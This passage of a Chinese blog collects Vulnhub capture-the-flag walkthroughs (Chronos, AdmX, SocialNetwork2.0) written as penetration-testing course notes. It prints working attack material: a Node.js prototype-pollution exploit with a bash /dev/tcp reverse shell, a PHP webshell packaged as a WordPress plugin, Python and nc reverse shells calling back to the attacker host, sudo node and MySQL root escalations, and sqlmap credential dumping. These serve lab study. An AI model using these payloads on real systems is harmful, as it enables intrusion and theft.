class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
<p>信息收集差不多，那么接下来就是要提权了。</p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>Linux提权常用的三种方式：</p>
<ol type="1">
<li>内核漏洞</li>
<li>suid提权</li>
<li>sudo配置不当提权</li>
</ol>
<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
<p>提权成功。</p>
<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
<p>至此，渗透过程结束。</p>
<h1 id="彩蛋部分">彩蛋部分</h1>
<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
<h1 id="总结">总结</h1>
<p>通过对这个靶机的渗透，有以下几点感受：</p>
<ol type="1">
<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
<li>学习了第三种Linux提权的方式</li>
<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>node.js原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>第4周：Vulnhub AdmX writeup</title>
    <url>/2022/04/03/%E7%AC%AC4%E5%91%A8%EF%BC%9AVulnhub%20AdmX%20writeup/</url>
    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第4周，该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
<p>难度：Medium</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：取得2个flag，获得root权限</p>
<p><strong>涉及的攻击方法</strong>：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web路径爆破（目录扫描）</li>
<li>BP自动替换</li>
<li>密码爆破</li>
<li>MSF漏洞利用</li>
<li>Wordpress漏洞利用</li>
<li>NC反弹shell升级：nc反弹的shell是残缺的，比如缺少文件名补全。这个方法就是获得完整的shell。</li>
<li>蚁剑上线</li>
<li>利用MySQL提权</li>
</ul>
<h1 id="配置信息">配置信息</h1>
<p>这里使用NAT模式。配置很简单，只需要在virtual box中的全局设定中添加一张网卡，然后虚拟机选择NAT模式，此时会自动选择刚刚创建的网卡。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214433.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214443.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214459.png" /></p>
<h1 id="单用户模式">单用户模式</h1>
<p>本题的虚拟机无法扫描到IP。因此进入单用户模式，修改网卡名称即可。具体可以看<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjI1OTc5Mw==&amp;mid=2652172616&amp;idx=1&amp;sn=f72eaf0db6af6e9ec68e17ed30479852&amp;chksm=bd0ba3f68a7c2ae09cd08de9006e86c417ac27ca3d11f603aa30d14fe402b2b5cb4bc55a5545&amp;scene=126&amp;&amp;sessionid=1648903615#rd">修改网卡</a></p>
<p><strong>步骤</strong>：</p>
<p>在启动或者重启，显示virtual box那个界面之后黑屏的时候，按住方向键上，进入如下界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204842.png" /></p>
<p>此时按 e，进入如下界面，找到红框位置：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204947.png" /></p>
<p>将红框的内容修改为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205050.png" /></p>
<p>一定要是 rw，否则无法修改配置文件！</p>
<p>然后按<code>ctrl+x</code>或者F10启动。然后输入<code>ip a</code>查看网卡信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205339.png" /></p>
<p>查看网络配置文件中的网卡名称（该靶机的系统是Ubuntu，因此选第二个）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># RedHat Linux</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"># UBUNTU</span><br><span class="line">vi /etc/netplan/00-installer-config.yaml</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205436.png" /></p>
<p>将 ens33 修改成功网卡信息中的红框位置的名字。然后保存并退出，重启计算机即可获得IP。</p>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214748.png" /></p>
<p>1,2,3其实都不是；4是kali，因此靶机IP为10.0.2.5</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215226.png" /></p>
<p>只开了一个80端口</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215338.png" /></p>
<ol type="1">
<li>靶机系统是Ubuntu</li>
<li>80端口上的服务是http</li>
<li>apache 版本 2.4.13</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>访问之后发现就是一个apache的页面，没有其他信息，因此直接进行web路径扫描。这里使用新的工具feroxbuster。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.5</span><br></pre></td></tr></table></figure></p>
<p>（注意，如果报错仔细看信息，可能是因为没有字典）</p>
<p>该工具不自带字典，因此有两种方法：</p>
<ul>
<li><code>sudo apt install seclists</code> 安装字典</li>
<li>自己指定字典</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222016.png" /></p>
<p>虽然都是301，但是301是重定向，并不是不存在，因此可以尝试访问。注意到两个东西：</p>
<ol type="1">
<li>出现了很多的 wordpress</li>
<li>还有一个admin，这个可能是后台地址</li>
</ol>
<p>我们先访问 wordpress，发现页面过了很久才加载出来。而admin更是直接无法访问。因此，聚焦在 <code>http://10.0.2.5/wordpress/</code> 上，<strong>这里能够加载出页面，但是速度很慢，这是为什么呢？因此尝试抓包看一下</strong>。发现了异常：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222458.png" /></p>
<p>我们只访问了 10.0.2.5，但是数据包却出现了 192.168.159.145，这并不是该网段的IP，此时想起了前面的301，因此猜测，这是后台重定向到了192那个IP地址。</p>
<p>查看响应包：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222730.png" /></p>
<p>发现 192.168.159.145 有20个匹配，这说明后台将重定向的IP地址写死了。不论谁访问10.0.2.5都会被重定向到192.168.159.145，这一看就是内网地址。<strong>因此，接下来的思路就是不让靶机请求192.168.159.145的资源，而是让它请求10.0.2.5的资源</strong>。</p>
<h2 id="bp自动替换">BP自动替换</h2>
<p>进入BP修改以下信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223246.png" /></p>
<p>此时刷新页面，成功加载！</p>
<p>接下来进行web功能点测试，测试之后发现，没有存在可利用的漏洞。忽然想起之前有一个wp-admin目录，尝试访问一下。出现后台登录界面！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223545.png" /></p>
<h2 id="密码爆破">密码爆破</h2>
<p>看见登录框，首先尝试一下万能密码，发现行不通。但是在测试过程中发现有时候会提示<code>wrong username</code>，有时候却提示<code>The password you entered for the username **admin** is incorrect.</code>。这说明存在着admin这个用户。并且测试过程中发现可以随便实验，没有次数、时间限制，也没有验证码，因此可以采用密码爆破！</p>
<p>密码爆破首先得知道用户名，有两个方法：</p>
<ol type="1">
<li>根据报错信息</li>
<li>搜索相关CMS的默认管理员、普通账户</li>
</ol>
<p>使用BP进行爆破，这里推荐使用<a href="https://github.com/fuzz-security/SuperWordlist">superwordlist</a>中的MidPwds.txt这个字典。（由于这个字典太多了，kali自带的BP不是pro，爆破速度太慢了，因此我自定义了100个进行演示）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204448.png" /></p>
<p>可以发现只有adam14的响应包长度与其他的不同，并且设置了许多的cookie，然后重定向到 wp-admin，因此，有理由猜测这就是密码，回到登录界面尝试，发现登录成功！因此，最终发现密码是adam14。（如果提示验证邮箱选择左下角的稍后提醒）</p>
<h2 id="后台get-shell">后台get shell</h2>
<p>后台get shell的方式一般有以下三种（本题为例）：</p>
<ol type="1">
<li>Media里面的文件上传功能，上传后门</li>
<li>Appearance里theme模板（PHP文件）的修改</li>
<li>plugins修改现有的插件的php，或者手动写插件然后上传（上传的webshell要找到路径）</li>
</ol>
<h3 id="第一种">第一种</h3>
<p>不论是否免杀，都无法上传</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231623.png" /></p>
<h3 id="第二种">第二种</h3>
<p>注意到刚进来后台的时候写着使用的主题是<code>Twenty Twenty-One</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231928.png" /></p>
<p>发现不可以修改文件。</p>
<h3 id="第三种">第三种</h3>
<p>推荐自己写一个插件然后上传。如果没有上传功能，那就修改现有插件。这里有上传功能。</p>
<p>先查看现有的两个插件的写法，发现有一个共同点，那就是头文件！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402232516.png" /></p>
<p>得包含这些东西</p>
<p>因此，写一个如下插件： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Plugin Name: webshell</span></span><br><span class="line"><span class="comment">* Plugin URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* Descritption: WP webshell for pentest</span></span><br><span class="line"><span class="comment">* Version: 1.0</span></span><br><span class="line"><span class="comment">* Author: hdfzzf</span></span><br><span class="line"><span class="comment">* Author URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* License: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（经过测试，如果不写头部信息，插件安装会不成功）</p>
<p>安装成功后需要激活插件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402233227.png" /></p>
<p>现在需要知道插件上传之后的路径。网络搜索发现该CMS插件的路径是<code>/wordpress/wp-content/plugins/</code>。因此访问<code>10.0.2.5/wordpress/wp-content/plugins/shell.php?shell=id</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402234611.png" /></p>
<p>成功执行了命令。</p>
<p>这里可以使用：</p>
<ol type="1">
<li>python反弹shell</li>
<li>nc拿shell</li>
<li>msf</li>
</ol>
<p>kali监听 3333 端口，然后网页输入如下命令： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>也可以通过nc串联：</p>
<p>kali监听两个端口，然后网页执行下面 命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.4 3333|/bin/bash|nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure></p>
<p>不过这里再介绍一种，那就是msf反弹shell。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. msfconsole  启动msf</span><br><span class="line">2. search wordpress admin</span><br><span class="line">3. use 2  选择第二个</span><br><span class="line">4. show options</span><br><span class="line">5. 设置参数</span><br><span class="line">6. run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235756.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235736.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235840.png" /></p>
<p>成功！</p>
<h2 id="shell升级">shell升级</h2>
<p>提权获得的shell是残缺的，无法完成互动操作，比如修改代码，自动补齐。因此，接下来需要升级（以python get shell做示范。该方法只针对bash） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2. ctrl+z 将获得的shell暂停，切到后台</span><br><span class="line">3. stty raw -echo</span><br><span class="line">4. fg 将刚刚放入后台的进程切到前台</span><br><span class="line">5. export SHELL=/bin/bash</span><br><span class="line">6. export TERM=screen</span><br><span class="line">7. stty rows 38 columns 116 设置大小</span><br><span class="line">8. reset</span><br><span class="line">9. shell成功升级</span><br><span class="line"></span><br><span class="line">注意：如果kali使用的是zsh，需要切换为bash。</span><br><span class="line">	1. chsh -s /bin/bash（不能加sudo，否则修改的是root的shell）</span><br><span class="line">	2. 重启</span><br><span class="line">	3. echo $SHELL 确认一下</span><br></pre></td></tr></table></figure></p>
<p><strong>如果利用nc获得一个shell，容易不小心按ctrl+c或者某种原因退出了shell。并且，有的web程序不能多次触发漏洞反弹shell（可能触发一次后环境就变了，只能等待对方重启服务器）。因此，获得一个shell后，应该基于这个shell去获得2-3个shell，比如一句话木马</strong></p>
<p>回想刚刚后台get shell的第二种方法，此时已经获得了shell，因此可以修改php文件（或者添加php文件）来用其他工具连接，比如蚁剑。</p>
<p>这里修改主题里面的404.php文件，也就是刚刚修改不成功的那个。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193531.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202613.png" /></p>
<p>成功连接</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202630.png" /></p>
<p>这就是为什么要进行shell升级，否则无法该代码，用蚁剑连接。</p>
<h2 id="信息收集">信息收集</h2>
<p>发现了<code>/home</code>目录下有一个用户 wpadmin</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193944.png" /></p>
<p>并且在wpadmin的目录下，有一个txt文件，猜测这就是flag文件，但经过测试，现在的权限不够查看。</p>
<p>还在<code>/root</code>目录下发现一个txt文件，这应该是另一个flag文件，但遗憾的是，还是没有权限。</p>
<p>查看用户<code>cat /etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194131.png" /></p>
<p>查看系统内核<code>uname -a</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194203.png" /></p>
<p>查看sudo配置，发现权限不够。</p>
<p>查看wordpress目录下的配置文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194406.png" /></p>
<p>发现了数据库的名称，用户名和密码。</p>
<p>信息收集差不多了，接下来就需要进行提权了。</p>
<h2 id="权限提升">权限提升</h2>
<h3 id="wpadmin权限">wpadmin权限</h3>
<p>想起刚刚查看wordpress配置文件的时候发现了用户名和密码，因此尝试登录wpadmin试试，尝试失败。这时候想到，刚刚密码爆破还有一个密码，因此再次尝试，发现成功。密码是：adam14</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195257.png" /></p>
<p>此时可以先读取第一个flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195341.png" /></p>
<h3 id="root权限">root权限</h3>
<p>（如果刚刚没有升级shell，这里无法连接数据库！！！） 刚刚发现得到了系统内核，用msf查找，发现没有漏洞可以利用。</p>
<p>接下来查看sudo配置 <code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195815.png" /></p>
<p>发现，wpadmin可以以root权限启动数据库，因此，输入下面的命令启动数据库，经过尝试，密码也是adam14。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /urs/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195950.png" /></p>
<p>成功登录数据库。</p>
<blockquote>
<p>小知识：数据库可以利用 system cmd 执行系统命令。这里我们是以root方式启动的数据库，因此使用system执行命令的时候也是root权限。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200101.png" /></p>
<p>执行 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system /bin/bash -i</span><br><span class="line"></span><br><span class="line">-i 表示shell表示bash是交互的。其实这里不加也没关系</span><br></pre></td></tr></table></figure></p>
<p>获得root权限的shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200246.png" /></p>
<p>成功拿到flag，也成功得到root权限。至此，这个靶机结束！</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透，学到了MySQL的提权方式，对该靶机来说，归根结底还是sudo配置不当。</p>
<p>其次，知道了如果请求一个网页反应慢，可能是因为后台源码请求某个IP地址，该IP地址在原来的环境下是靶机的IP内网IP地址，所以在原来的环境下请求速度正常，但是一旦移植到自己的环境，比如虚拟机，那么就会出问题。此时，就可以利用BP的自动替换，将代码中写死的IP地址改为当前靶机的IP地址。</p>
<p>最后，就是学习了如何将“残缺的”shell升级为交互式的shell。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>MySQL提取</tag>
        <tag>shell升级</tag>
        <tag>BP自动替换</tag>
      </tags>
  </entry>
  <entry>
    <title>第5周：Vulvhub SocialNetwork2.0 Writeup</title>
    <url>/2022/04/06/%E7%AC%AC5%E5%91%A8%EF%BC%9AVulvhub%20SocialNetwork2.0%20Writeup/</url>
    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第5周，该靶机难度困难，涉及到二进制（不会！）。这个靶机的难点就是在缓冲区溢出漏洞。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/">social_network_2.0</a></p>
<p>难度：Hard</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：获得root权限</p>
<p><strong>涉及的攻击方法</strong>：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>SQL注入</li>
<li>文件上传</li>
<li>蚁剑上线</li>
<li>CVE利用</li>
<li><strong>XMLRPC命令执行</strong></li>
<li>*动态调试</li>
<li>漏洞利用代码编写**</li>
</ul>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203809.png" /></p>
<p>靶机IP为：10.0.2.8</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203853.png" /></p>
<p>靶机开了2个端口：80，8000</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204014.png" /></p>
<ol type="1">
<li>80和8000端口的服务都是http</li>
<li>靶机系统是Ubuntu</li>
<li>80端口上的CMS是Apache，版本为2.4.29</li>
<li>8000端口上的服务是BaseHTTPServer，版本为0.3</li>
<li>靶机上有python2的环境</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>首先访问8000端口，发现提示信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error code 501.</span><br><span class="line">Message: Unsupported method (&#x27;GET&#x27;).</span><br><span class="line">Error code explanation: 501 = Server does not support this operation. </span><br></pre></td></tr></table></figure></p>
<p>简而言之就是服务端不接受GET请求方式。因此，我们换请求方式，但是在尝试了所有请求方式后发现都不行。这个端口的思路到此就断了。</p>
<p>那访问80端口，发现是一个登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204512.png" /></p>
<p>首先尝试万能密码，但被提示<code>invalid email format</code>。因此，就需要换一个思路。<strong>注意到该网址有一个<code>Sign Up</code>功能，因此，接下来应该先注册一个账号，然后收集登陆进去的信息</strong>。这是非常重要的思路！</p>
<p>进去之后发现这是一个类似微博一样的功能，注意到除了我之外还有两个用户<code>admin admin</code> 和<code>testuser testuers</code>。还注意到有一个<strong>搜索框</strong>以及头像可以<strong>上传文件</strong>！</p>
<h2 id="蚁剑上线">蚁剑上线</h2>
<p>先测试上传文件功能点。上传一个一句话，然后鼠标右键头像，打开链接，发现成功打开，并且得到文件的路径。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205340.png" /></p>
<p>直接使用蚁剑连接。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205811.png" /></p>
<h2 id="sql注入">SQL注入</h2>
<p>测试刚刚那个搜索框，先输入一个单引号，发现报错了，因此，存在SQL注入，并且数据库为MySQL</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405210036.png" /></p>
<p>直接用sqlmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sqlmap -r r.txt -p query <span class="comment"># 其中r.txt保存的是搜索的请求数据包</span></span><br><span class="line">2. sqlmap -r r.txt -p query --dbs</span><br><span class="line">3. sqlmap -r r.txt -p query -D socialnetwork --tables</span><br><span class="line">4. sqlmap -r r.txt -p query -D socialnetwork -T users --columns</span><br><span class="line">5. sqlmap -r r.txt -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure></p>
<p>成功获得邮箱和密码的hash值，一般密码都是md5加密的，因此解密之后得到下表：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">email</th>
<th style="text-align: center;">encryPasswd</th>
<th style="text-align: center;">passwd</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>admin@localhost.com</code></td>
<td style="text-align: center;">21232f297a57a5a743894a0e4a801fc3</td>
<td style="text-align: center;">admin</td>
</tr>
